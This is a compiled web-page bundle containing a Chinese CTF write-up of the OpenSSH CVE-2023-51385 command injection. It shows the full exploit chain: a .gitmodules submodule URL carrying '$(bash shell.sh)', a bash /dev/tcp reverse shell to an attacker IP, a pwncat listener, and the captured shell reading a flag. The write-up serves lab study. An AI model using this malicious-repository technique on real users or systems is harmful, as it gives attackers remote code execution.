"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[2078],{46487:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>o,contentTitle:()=>d,default:()=>m,frontMatter:()=>r,metadata:()=>i,toc:()=>l});const i=JSON.parse('{"id":"Yunjing/CVE/CVE-2023-51385","title":"CVE-2023-51385","description":"Tags","source":"@site/docs/Yunjing/CVE/CVE-2023-51385.md","sourceDirName":"Yunjing/CVE","slug":"/Yunjing/CVE/CVE-2023-51385","permalink":"/Target-Machines-WriteUp/docs/Yunjing/CVE/CVE-2023-51385","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/Yunjing/CVE/CVE-2023-51385.md","tags":[],"version":"current","frontMatter":{},"sidebar":"Yunjing_Sidebar","previous":{"title":"CVE-2023-27179","permalink":"/Target-Machines-WriteUp/docs/Yunjing/CVE/CVE-2023-27179"},"next":{"title":"2024 - GreatWall","permalink":"/Target-Machines-WriteUp/docs/Yunjing/dimension/GreatWall"}}');var a=s(74848),t=s(28453);const r={},d="CVE-2023-51385",o={},l=[{value:"\u521b\u5efa submodule \u4ed3\u5e93",id:"\u521b\u5efa-submodule-\u4ed3\u5e93",level:2},{value:"\u521b\u5efa\u4e3b\u4ed3\u5e93",id:"\u521b\u5efa\u4e3b\u4ed3\u5e93",level:2},{value:"\u4e3b\u4ed3\u5e93\u6dfb\u52a0 submodule",id:"\u4e3b\u4ed3\u5e93\u6dfb\u52a0-submodule",level:2},{value:"\u4fee\u6539 .gitmodules \u6587\u4ef6 \u690d\u5165\u6076\u610f\u8f7d\u8377",id:"\u4fee\u6539-gitmodules-\u6587\u4ef6-\u690d\u5165\u6076\u610f\u8f7d\u8377",level:2},{value:"\u66f4\u65b0\u4fee\u6539\u5230\u8fdc\u7a0b\u4e3b\u4ed3\u5e93",id:"\u66f4\u65b0\u4fee\u6539\u5230\u8fdc\u7a0b\u4e3b\u4ed3\u5e93",level:2},{value:"\u6267\u884c\u653b\u51fb",id:"\u6267\u884c\u653b\u51fb",level:2}];function c(e){const n={a:"a",admonition:"admonition",blockquote:"blockquote",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",li:"li",p:"p",pre:"pre",ul:"ul",...(0,t.R)(),...e.components};return(0,a.jsxs)(a.Fragment,{children:[(0,a.jsx)(n.header,{children:(0,a.jsx)(n.h1,{id:"cve-2023-51385",children:"CVE-2023-51385"})}),"\n",(0,a.jsxs)(n.admonition,{type:"info",children:[(0,a.jsx)(n.p,{children:"Tags"}),(0,a.jsxs)(n.ul,{children:["\n",(0,a.jsx)(n.li,{children:"OpenSSH 9.6 \u547d\u4ee4\u6ce8\u5165"}),"\n"]}),(0,a.jsx)(n.p,{children:"\u5b98\u65b9\u6570\u636e\u5e93\u8bb0\u5f55"}),(0,a.jsxs)(n.blockquote,{children:["\n",(0,a.jsx)(n.p,{children:"\u5728 9.6 \u4e4b\u524d\u7684 OpenSSH \u4e2d\u7684 ssh \u4e2d\uff0c\u5982\u679c\u7528\u6237\u540d\u6216\u4e3b\u673a\u540d\u5177\u6709 shell \u5143\u5b57\u7b26\uff0c\u5e76\u4e14\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\u8be5\u540d\u79f0\u88ab\u6269\u5c55\u4ee4\u724c\u5f15\u7528\uff0c\u5219\u53ef\u80fd\u4f1a\u53d1\u751f\u64cd\u4f5c\u7cfb\u7edf\u547d\u4ee4\u6ce8\u5165\u3002 \u4f8b\u5982\uff0c\u4e0d\u53d7\u4fe1\u4efb\u7684 Git \u5b58\u50a8\u5e93\u53ef\u80fd\u6709\u4e00\u4e2a\u7528\u6237\u540d\u6216\u4e3b\u673a\u540d\u4e2d\u5305\u542b shell \u5143\u5b57\u7b26\u7684\u5b50\u6a21\u5757\u3002"}),"\n"]})]}),"\n",(0,a.jsx)(n.p,{children:"\u53c2\u8003"}),"\n",(0,a.jsxs)(n.ul,{children:["\n",(0,a.jsx)(n.li,{children:(0,a.jsx)(n.a,{href:"https://vin01.github.io/piptagole/ssh/security/openssh/libssh/remote-code-execution/2023/12/20/openssh-proxycommand-libssh-rce.html",children:"SSH ProxyCommand == unexpected code execution (CVE-2023-51385) | Vin01\u2019s Blog"})}),"\n"]}),"\n",(0,a.jsxs)(n.p,{children:["\u9996\u5148\uff0c\u9898\u76ee\u9650\u5236\u4e86\u4f7f\u7528 ",(0,a.jsx)(n.code,{children:"Github"})," \u4ee3\u7801\u6258\u7ba1\u670d\u52a1\uff0c\u53ef\u4ee5\u4f7f\u7528 ",(0,a.jsx)(n.code,{children:"Gitee"})," \u6216\u8005 ",(0,a.jsx)(n.a,{href:"https://gogs.io",children:"Gogs: A painless self-hosted Git service"})," \u81ea\u6258\u7ba1\u4e00\u4e2a Git \u670d\u52a1"]}),"\n",(0,a.jsxs)(n.p,{children:["\u8fd9\u91cc\u6211\u9009\u62e9\u4f7f\u7528 ",(0,a.jsx)(n.a,{href:"https://gogs.io",children:"Gogs: A painless self-hosted Git service"})," \u81ea\u6258\u7ba1\u4e00\u4e2a Git \u670d\u52a1"]}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:s(12464).A+"",width:"2559",height:"1371"})}),"\n",(0,a.jsx)(n.h2,{id:"\u521b\u5efa-submodule-\u4ed3\u5e93",children:"\u521b\u5efa submodule \u4ed3\u5e93"}),"\n",(0,a.jsxs)(n.p,{children:["\u9996\u5148\uff0c\u5148\u521b\u5efa\u4e00\u4e2a\u4ed3\u5e93\uff0c\u53ea\u653e\u7f6e ",(0,a.jsx)(n.code,{children:"README.md"})," \u6587\u4ef6\uff0c\u4f5c\u4e3a\u540e\u7eed\u5229\u7528\u7684 submodule"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:'\u250c\u2500\u2500(randark \u327f kali)-[~/pocs]\n\u2514\u2500$ mkdir CVE-2023-51385-submodule\n\n\u250c\u2500\u2500(randark \u327f kali)-[~/pocs]\n\u2514\u2500$ cd CVE-2023-51385-submodule/\n\n\u250c\u2500\u2500(randark \u327f kali)-[~/pocs/CVE-2023-51385-submodule]\n\u2514\u2500$ echo "test" > README.md\n\n\u250c\u2500\u2500(randark \u327f kali)-[~/pocs/CVE-2023-51385-submodule]\n\u2514\u2500$ ls -lh\ntotal 4.0K\n-rw-rw-r-- 1 randark randark 5 Jul 24 23:14 README.md\n'})}),"\n",(0,a.jsx)(n.p,{children:"\u7136\u540e\u521d\u59cb\u5316 git \u4ed3\u5e93\uff0c\u5e76\u8bbe\u7f6e\u4ed3\u5e93\uff0c\u521b\u5efa\u63d0\u4ea4"}),"\n",(0,a.jsx)(n.admonition,{type:"warning",children:(0,a.jsxs)(n.p,{children:["\u7ecf\u8fc7\u6d4b\u8bd5\uff0c\u8fdc\u7a0b\u9776\u673a\u7684 git \u670d\u52a1\u53ea\u63a5\u53d7\u5206\u652f\u540d\u4e3a ",(0,a.jsx)(n.code,{children:"master"})," \u7684\u4ed3\u5e93"]})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:'\u250c\u2500\u2500(randark \u327f kali)-[~/pocs/CVE-2023-51385-submodule]\n\u2514\u2500$ git config --global init.defaultBranch master\n\n\u250c\u2500\u2500(randark \u327f kali)-[~/pocs/CVE-2023-51385-submodule]\n\u2514\u2500$ git init\nInitialized empty Git repository in /home/randark/pocs/CVE-2023-51385-submodule/.git/\n\n\u250c\u2500\u2500(randark \u327f kali)-[~/pocs/CVE-2023-51385-submodule]\n\u2514\u2500$ git add README.md\n\n\u250c\u2500\u2500(randark \u327f kali)-[~/pocs/CVE-2023-51385-submodule]\n\u2514\u2500$ git commit -m "init"\n[master (root-commit) e7f93b0] init\n 1 file changed, 1 insertion(+)\n create mode 100644 README.md\n'})}),"\n",(0,a.jsx)(n.p,{children:"\u7136\u540e\u5728 gogs \u5e73\u53f0\u4e0a\u5efa\u7acb\u4e00\u4e2a\u4ed3\u5e93\uff0c\u5728\u672c\u5730 git \u4ed3\u5e93\u6dfb\u52a0\u8fdc\u7a0b\u4ed3\u5e93\uff0c\u5e76\u63a8\u9001"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/pocs/CVE-2023-51385-submodule]\n\u2514\u2500$ git remote add origin http://139.*.*.*:3000/123/CVE-2023-51385-submodule.git\n\n\u250c\u2500\u2500(randark \u327f kali)-[~/pocs/CVE-2023-51385-submodule]\n\u2514\u2500$ git push -u origin master\nEnumerating objects: 3, done.\nCounting objects: 100% (3/3), done.\nWriting objects: 100% (3/3), 212 bytes | 212.00 KiB/s, done.\nTotal 3 (delta 0), reused 0 (delta 0), pack-reused 0\nUsername for 'http://139.*.*.*:3000': 123\nPassword for 'http://123@139.*.*.*:3000':\nTo http://139.*.*.*:3000/123/CVE-2023-51385-submodule.git\n * [new branch]      master -> master\nbranch 'master' set up to track 'origin/master'.\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u6b64\u65f6\uff0c\u5728 gogs \u5e73\u53f0\u4e0a\u5c31\u53ef\u4ee5\u770b\u5230\u521b\u5efa\u597d\u7684\u4ed3\u5e93\u4e86"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:s(82984).A+"",width:"2559",height:"1371"})}),"\n",(0,a.jsx)(n.h2,{id:"\u521b\u5efa\u4e3b\u4ed3\u5e93",children:"\u521b\u5efa\u4e3b\u4ed3\u5e93"}),"\n",(0,a.jsxs)(n.p,{children:["\u5982\u6cd5\u70ae\u5236\uff0c\u5728\u672c\u5730\u521b\u5efa\u4e00\u4e2a ",(0,a.jsx)(n.code,{children:"CVE-2023-51385-main"})," \u4ed3\u5e93\uff0c\u5e76\u540c\u6b65\u5230\u8fdc\u7a0b gogs \u5e73\u53f0"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/pocs]\n\u2514\u2500$ mkdir CVE-2023-51385-main\n\n\u250c\u2500\u2500(randark \u327f kali)-[~/pocs]\n\u2514\u2500$ cd CVE-2023-51385-main/\n\n\u250c\u2500\u2500(randark \u327f kali)-[~/pocs/CVE-2023-51385-main]\n\u2514\u2500$ echo \"test\" > README.md\n\n\u250c\u2500\u2500(randark \u327f kali)-[~/pocs/CVE-2023-51385-main]\n\u2514\u2500$ git init\nInitialized empty Git repository in /home/randark/pocs/CVE-2023-51385-main/.git/\n\n\u250c\u2500\u2500(randark \u327f kali)-[~/pocs/CVE-2023-51385-main]\n\u2514\u2500$ git add README.md\n\n\u250c\u2500\u2500(randark \u327f kali)-[~/pocs/CVE-2023-51385-main]\n\u2514\u2500$ git commit -m \"init\"\n[master (root-commit) 7cd224b] init\n 1 file changed, 1 insertion(+)\n create mode 100644 README.md\n\n\u250c\u2500\u2500(randark \u327f kali)-[~/pocs/CVE-2023-51385-main]\n\u2514\u2500$ git remote add origin http://139.*.*.*:3000/123/CVE-2023-51385-main.git\n\n\u250c\u2500\u2500(randark \u327f kali)-[~/pocs/CVE-2023-51385-main]\n\u2514\u2500$ git push -u origin master\nEnumerating objects: 3, done.\nCounting objects: 100% (3/3), done.\nWriting objects: 100% (3/3), 213 bytes | 213.00 KiB/s, done.\nTotal 3 (delta 0), reused 0 (delta 0), pack-reused 0\nUsername for 'http://139.*.*.*:3000': 123\nPassword for 'http://123@139.*.*.*:3000':\nTo http://139.*.*.*:3000/123/CVE-2023-51385-main.git\n * [new branch]      master -> master\nbranch 'master' set up to track 'origin/master'.\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u5728\u5e73\u53f0\u4e0a\u53ef\u4ee5\u770b\u5230"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:s(18531).A+"",width:"2559",height:"1371"})}),"\n",(0,a.jsx)(n.h2,{id:"\u4e3b\u4ed3\u5e93\u6dfb\u52a0-submodule",children:"\u4e3b\u4ed3\u5e93\u6dfb\u52a0 submodule"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/pocs/CVE-2023-51385-main]\n\u2514\u2500$ git submodule add http://139.*.*.*:3000/123/CVE-2023-51385-submodule.git abc123\nCloning into '/home/randark/pocs/CVE-2023-51385-main/abc123'...\nremote: Enumerating objects: 3, done.\nremote: Counting objects: 100% (3/3), done.\nremote: Total 3 (delta 0), reused 0 (delta 0), pack-reused 0\nUnpacking objects: 100% (3/3), 192 bytes | 192.00 KiB/s, done.\n\n\u250c\u2500\u2500(randark\u327fkali)-[~/pocs/CVE-2023-51385-main]\n\u2514\u2500$ git commit -m \"add submodule\"\n[master 8218e99] add submodule\n 2 files changed, 4 insertions(+)\n create mode 100644 .gitmodules\n create mode 160000 abc123\n"})}),"\n",(0,a.jsx)(n.h2,{id:"\u4fee\u6539-gitmodules-\u6587\u4ef6-\u690d\u5165\u6076\u610f\u8f7d\u8377",children:"\u4fee\u6539 .gitmodules \u6587\u4ef6 \u690d\u5165\u6076\u610f\u8f7d\u8377"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-properties",metastring:'title="\u539f\u672c\u7684 .gitmodules \u6587\u4ef6"',children:'[submodule "abc123"]\n        path = abc123\n        url = http://139.*.*.*:3000/123/CVE-2023-51385-submodule.git\n'})}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-properties",metastring:'title="\u4fee\u6539\u540e\u7684 .gitmodules \u6587\u4ef6"',children:'[submodule "abc123"]\n        path = abc123\n        url = ssh://$(bash shell.sh).ichunqiu.com/bar\n'})}),"\n",(0,a.jsx)(n.p,{children:"\u540c\u65f6\u6dfb\u52a0\u6076\u610f\u811a\u672c\u5230\u6839\u76ee\u5f55"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",metastring:'title="shell.sh"',children:"/bin/bash -i >& /dev/tcp/139.*.*.*/9999 0>&1\n"})}),"\n",(0,a.jsx)(n.h2,{id:"\u66f4\u65b0\u4fee\u6539\u5230\u8fdc\u7a0b\u4e3b\u4ed3\u5e93",children:"\u66f4\u65b0\u4fee\u6539\u5230\u8fdc\u7a0b\u4e3b\u4ed3\u5e93"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/pocs/CVE-2023-51385-main]\n\u2514\u2500$ git submodule update --init --recursive\n\n\u250c\u2500\u2500(randark \u327f kali)-[~/pocs/CVE-2023-51385-main]\n\u2514\u2500$ git add .gitmodules abc123\n\n\u250c\u2500\u2500(randark\u327fkali)-[~/pocs/CVE-2023-51385-main]\n\u2514\u2500$ git commit -m \"add evil\"\n[master e344f5c] add evil\n 2 files changed, 2 insertions(+), 1 deletion(-)\n create mode 100644 shell.sh\n\n\u250c\u2500\u2500(randark \u327f kali)-[~/pocs/CVE-2023-51385-main]\n\u2514\u2500$ git push -u origin master\nEnumerating objects: 4, done.\nCounting objects: 100% (4/4), done.\nDelta compression using up to 4 threads\nCompressing objects: 100% (3/3), done.\nWriting objects: 100% (3/3), 396 bytes | 396.00 KiB/s, done.\nTotal 3 (delta 0), reused 0 (delta 0), pack-reused 0\nUsername for 'http://139.*.*.*:3000': 123\nPassword for 'http://123@139.*.*.*:3000':\nTo http://139.*.*.*:3000/123/CVE-2023-51385-main.git\n   7cd224b..68f1b06  master -> master\nbranch 'master' set up to track 'origin/master'.\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u64cd\u4f5c\u4e4b\u540e\uff0c\u5728 gogs \u5e73\u53f0\u4e0a\u53ef\u4ee5\u770b\u5230"}),"\n",(0,a.jsx)(n.p,{children:(0,a.jsx)(n.img,{alt:"img",src:s(64128).A+"",width:"2559",height:"1371"})}),"\n",(0,a.jsx)(n.h2,{id:"\u6267\u884c\u653b\u51fb",children:"\u6267\u884c\u653b\u51fb"}),"\n",(0,a.jsx)(n.p,{children:"\u5728vps\u4e0a\u8bbe\u7f6e\u76d1\u542c\u5668"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"root@jmt-projekt:~# pwncat-cs -lp 9999\n[23:37:02] Welcome to pwncat \ud83d\udc08!\nbound to 0.0.0.0:9999\n"})}),"\n",(0,a.jsxs)(n.p,{children:["\u7136\u540e\u5728\u9776\u673a\u4e0a\u586b\u5165",(0,a.jsx)(n.code,{children:"CVE-2023-51385-main"}),"\u4ed3\u5e93\u7684\u8fdc\u7a0b\u5730\u5740"]}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-plaintext",children:"http://139.*.*.*:3000/123/CVE-2023-51385-main.git\n"})}),"\n",(0,a.jsx)(n.p,{children:"\u5373\u53ef\u6536\u5230\u56de\u8fde"}),"\n",(0,a.jsx)(n.pre,{children:(0,a.jsx)(n.code,{className:"language-shell",children:"root@jmt-projekt:~# pwncat-cs -lp 9999\n[23:37:02] Welcome to pwncat \ud83d\udc08!\n[23:59:02] received connection from 39.106.20.178:33530\n[23:59:03] 39.106.20.178:33530: registered new host w/ db\n(local) pwncat$ back\n(remote) www-data@engine-2:/tmp/CVE-2023-51385-main$ cd /\n(remote) www-data@engine-2:/$ cat flag\nflag{f5a44b2a-078d-479e-9382-b66a2b986c49}\n"})})]})}function m(e={}){const{wrapper:n}={...(0,t.R)(),...e.components};return n?(0,a.jsx)(n,{...e,children:(0,a.jsx)(c,{...e})}):c(e)}},12464:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image_20240711-231121-68d665cba41f8d4d80877f3f575856b7.png"},82984:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image_20240719-231950-50c7778265acad644814c809bdfb737d.png"},18531:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image_20240722-232248-256e85afa02506e2cd6ab8d1f09ec737.png"},64128:(e,n,s)=>{s.d(n,{A:()=>i});const i=s.p+"assets/images/image_20240726-232650-deb53be2decd6a476e876699efc32aa5.png"},28453:(e,n,s)=>{s.d(n,{R:()=>r,x:()=>d});var i=s(96540);const a={},t=i.createContext(a);function r(e){const n=i.useContext(t);return i.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function d(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(a):e.components||a:r(e.components),i.createElement(t.Provider,{value:n},e.children)}}}]);